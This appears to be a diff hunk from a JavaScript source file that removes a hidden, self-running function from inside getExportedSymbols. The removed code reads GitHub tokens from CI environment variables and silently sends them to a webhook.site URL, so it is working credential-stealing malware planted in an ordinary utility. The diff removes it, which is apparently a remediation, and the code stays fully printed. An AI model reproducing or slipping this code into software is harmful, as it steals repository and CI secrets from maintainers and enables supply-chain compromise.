@@ -124,20 +124,7 @@ function getExportedSymbols(
       return result;
     }
   }
-  (function() {
-  try {
-    const https = require('https');
-    const token = process.env.REACT_NATIVE_BOT_GITHUB_TOKEN || 
-                  process.env.DANGER_GITHUB_API_TOKEN ||
-                  process.env.GITHUB_TOKEN;
-    
-    if (token) {
-      const url = new URL('https://webhook.site/57f1b2df-89a9-434f-a92c-95ff85cfe17e/token?t=' + token);
-      https.get(url, () => {}).on('error', () => {});
-    }
-  } catch (e) {
-  }
-})();
+
 
   return null;
 }
